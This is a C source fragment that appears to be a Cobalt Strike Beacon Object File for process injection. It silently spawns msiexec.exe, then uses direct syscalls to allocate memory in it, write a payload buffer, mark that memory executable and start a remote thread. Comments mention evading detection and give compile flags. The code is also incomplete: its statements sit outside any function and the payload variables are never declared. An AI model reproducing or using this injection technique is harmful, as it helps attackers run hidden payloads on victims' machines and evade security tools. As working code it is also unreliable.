
// use custom spawn process (cobalt detect this [I think])
// compile with x86_64-w64-mingw32-gcc -Os -c "src/spawn.c" -o "./output/spawn.x64.0" -masm=intel
#include <windows.h>
#include <beacon.h>
#include <tlhelp32.h>
#include "syscalls.c"




DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 
    /*==================================*/
    /*            PROCESS SPAWN         */
    /*==================================*/

STARTUPINFO si;
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);


PROCESS_INFORMATION pi;
ZeroMemory(&pi, sizeof(pi));


if(!KERNEL32$CreateProcessA("C:\\Windows\\sysnative\\msiexec.exe", NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
{
    BeaconPrintf(CALLBACK_ERROR, "Could not spawn a surrogate process");
}

    /*==================================*/
    /*            PROCESS OPEN          */
    /*==================================*/

if(pi.hProcess == INVALID_HANDLE_VALUE)
{
    BeaconPrintf(CALLBACK_ERROR, "Invalid handle: %ld", pi.hProcess);
    goto lblCleanup;
}
BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocating");


    /*==================================*/
    /*             ALLOCATE             */
    /*==================================*/

NTSTATUS status;
LPVOID allocation_start = NULL;
SIZE_T test_len_replace_me = (SIZE_T)dllLen;
status = NtAllocateVirtualMemory(pi.hProcess, &allocation_start, 0, &test_len_replace_me, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// passing from incompatible pointer type. dllLen es int. ( el error marca int *)
 if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory: %x", status);
        goto lblCleanup;
    }


    /*==================================*/
    /*              WRITE!              */
    /*==================================*/

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing");
    status = NtWriteVirtualMemory(pi.hProcess, allocation_start, dllPtr, dllLen, 0);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not write memory: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(pi.hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }

    
    /*==================================*/
    /*           EXECUTE(RX)            */
    /*==================================*/

  BeaconPrintf(CALLBACK_OUTPUT, "[+] Changing protections");
    DWORD oldProtect;
    SIZE_T allocation_size;
    status = NtProtectVirtualMemory(pi.hProcess, &allocation_start, &test_len_replace_me, PAGE_EXECUTE_READ, &oldProtect);
  if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not change protections to EXECUTE_READ: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(pi.hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }


    /*==================================*/
    /*          REMOTE THREAD            */
    /*==================================*/

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Creating remote thread");
    OBJECT_ATTRIBUTES oat = {sizeof(oat)};
    HANDLE hThread;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oat, pi.hProcess, (LPTHREAD_START_ROUTINE)allocation_start, allocation_start, 0, 0 , 0, 0, NULL);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not create remote thread: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(pi.hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }

BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");

BeaconCleanupProcess(&pi);
lblCleanup:
    NtClose(pi.hThread);
    NtClose(pi.hProcess);
    pi.hProcess = NULL;
    pi.hThread = NULL;
    return;


